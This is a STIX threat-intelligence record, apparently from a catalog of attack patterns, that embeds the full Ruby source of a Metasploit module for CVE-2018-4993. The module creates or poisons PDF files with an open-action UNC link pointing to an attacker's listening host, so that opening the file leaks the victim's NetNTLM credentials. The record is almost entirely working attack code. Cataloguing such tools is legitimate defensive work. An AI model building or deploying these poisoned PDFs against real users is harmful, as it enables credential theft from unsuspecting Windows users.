{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48c4bfd1-4ee2-4be3-8210-f5cef3f2d888",
    "created": "2024-08-14T16:21:45.374977Z",
    "modified": "2024-08-14T16:21:45.374981Z",
    "name": "BADPDF Malicious PDF Creator",
    "description": " This module can either creates a blank PDF file which contains a UNC link which can be used to capture NetNTLM credentials, or if the PDFINJECT option is used it will inject the necessary code into an existing PDF document if possible. ' 'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fileformat/badpdf.rb",
            "external_id": "badpdf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-4993"
        },
        {
            "source_name": "reference",
            "url": "https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n        'Name'          => 'BADPDF Malicious PDF Creator',\n        'Description'   => '\n          This module can either creates a blank PDF file which contains a UNC link which can be used\n          to capture NetNTLM credentials, or if the PDFINJECT option is used it will inject the necessary\n          code into an existing PDF document if possible.\n        ',\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n            [\n              'Assaf Baharav',    # Code provided as POC by CheckPoint\n              'Yaron Fruchtmann', # Code provided as POC by CheckPoint\n              'Ido Solomon',      # Code provided as POC by CheckPoint\n              'Richard Davy - secureyourit.co.uk', # Metasploit\n            ],\n        'Platform'      => ['win'],\n        'References'    =>\n        [\n          ['CVE', '2018-4993'],\n          ['URL', 'https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/']\n        ])\n      )\n    register_options(\n      [\n        OptAddress.new('LHOST', [true, 'Host listening for incoming SMB/WebDAV traffic', nil]),\n        OptString.new('FILENAME', [false, 'Filename']),\n        OptPath.new('PDFINJECT', [false, 'Path and filename to existing PDF to inject UNC link code into'])\n      ]\n    )\n  end\n\n  def run\n    if datastore['PDFINJECT'].nil? && datastore['FILENAME'].nil?\n      print_error 'Please configure either FILENAME or PDFINJECT'\n    elsif !datastore['PDFINJECT'].nil? && datastore['PDFINJECT'].to_s.end_with?('.pdf')\n      injectpdf\n    elsif !datastore['FILENAME'].nil? && datastore['FILENAME'].to_s.end_with?('.pdf')\n      createpdf\n    else\n      print_error \"FILENAME or PDFINJECT must end with '.pdf' file extension\"\n    end\n  end\n\n  def injectpdf\n    # Payload which gets injected\n    inject_payload = \"/AA <</O <</F (\\\\\\\\\\\\\\\\#{datastore['LHOST']}\\\\\\\\test)/D [ 0 /Fit]/S /GoToE>>>>\"\n\n    # if given path doesn't exist display error and return\n    unless File.exist?(datastore['PDFINJECT'])\n      # If file not found display error message\n      print_error \"File doesn't exist #{datastore['PDFINJECT']}\"\n      return\n    end\n\n    # Read in contents of file\n    content = File.binread(datastore['PDFINJECT'])\n\n    # Check for place holder - below ..should.. cover most scenarios.\n    newdata = ''\n    [2, 4, 6, 8].each do |pholder|\n      unless content.index(\"/Contents #{pholder} 0 R\").nil?\n        # If place holder exists create new file content\n        newdata = content[0..(content.index(\"/Contents #{pholder} 0 R\") + 14)] + inject_payload + content[(content.index(\"/Contents #{pholder} 0 R\") + 15)..-1]\n        break\n      end\n    end\n\n    # Display error message if we couldn't poison the file\n    if newdata.empty?\n      print_error 'Could not find placeholder to poison file this time....'\n      return\n    end\n\n    # Create new filename by replacing .pdf with _malicious.pdf\n    newfilename = \"#{datastore['PDFINJECT'].gsub(/\\.pdf$/, '')}_malicious.pdf\"\n    # Write content to file\n    File.open(newfilename, 'wb') { |file| file.write(newdata) }\n    # Check file exists and display path or error message\n    if File.exist?(newfilename)\n      print_good(\"Malicious file writen to: #{newfilename}\")\n    else\n      print_error 'Something went wrong creating malicious PDF file'\n    end\n  end\n\n  def createpdf\n    # Code below taken POC provided by CheckPoint Research\n    pdf = ''\n    pdf << \"%PDF-1.7\\n\"\n    pdf << \"1 0 obj\\n\"\n    pdf << \"<</Type/Catalog/Pages 2 0 R>>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"2 0 obj\\n\"\n    pdf << \"<</Type/Pages/Kids[3 0 R]/Count 1>>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"3 0 obj\\n\"\n    pdf << \"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"xref\\n\"\n    pdf << \"0 4\\n\"\n    pdf << \"0000000000 65535 f\\n\"\n    pdf << \"0000000015 00000 n\\n\"\n    pdf << \"0000000060 00000 n\\n\"\n    pdf << \"0000000111 00000 n\\n\"\n    pdf << \"trailer\\n\"\n    pdf << \"<</Size 4/Root 1 0 R>>\\n\"\n    pdf << \"startxref\\n\"\n    pdf << \"190\\n\"\n    pdf << \"3 0 obj\\n\"\n    pdf << \"<< /Type /Page\\n\"\n    pdf << \"   /Contents 4 0 R\\n\"\n    pdf << \"   /AA <<\\n\"\n    pdf << \"     /O <<\\n\"\n    pdf << \"        /F (\\\\\\\\\\\\\\\\#{datastore['LHOST']}\\\\\\\\test)\\n\"\n    pdf << \"      /D [ 0 /Fit]\\n\"\n    pdf << \"      /S /GoToE\\n\"\n    pdf << \"      >>\\n\"\n    pdf << \"     >>\\n\"\n    pdf << \"     /Parent 2 0 R\\n\"\n    pdf << \"     /Resources <<\\n\"\n    pdf << \"      /Font <<\\n\"\n    pdf << \"        /F1 <<\\n\"\n    pdf << \"          /Type /Font\\n\"\n    pdf << \"          /Subtype /Type1\\n\"\n    pdf << \"          /BaseFont /Helvetica\\n\"\n    pdf << \"          >>\\n\"\n    pdf << \"         >>\\n\"\n    pdf << \"       >>\\n\"\n    pdf << \">>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"4 0 obj<< /Length 100>>\\n\"\n    pdf << \"stream\\n\"\n    pdf << \"BT\\n\"\n    pdf << \"/TI_0 1 Tf\\n\"\n    pdf << \"14 0 0 14 10.000 753.976 Tm\\n\"\n    pdf << \"0.0 0.0 0.0 rg\\n\"\n    pdf << \"(PDF Document) Tj\\n\"\n    pdf << \"ET\\n\"\n    pdf << \"endstream\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"trailer\\n\"\n    pdf << \"<<\\n\"\n    pdf << \"  /Root 1 0 R\\n\"\n    pdf << \">>\\n\"\n    pdf << \"%%EOF\\n\"\n    # Write data to filename\n    file_create(pdf)\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}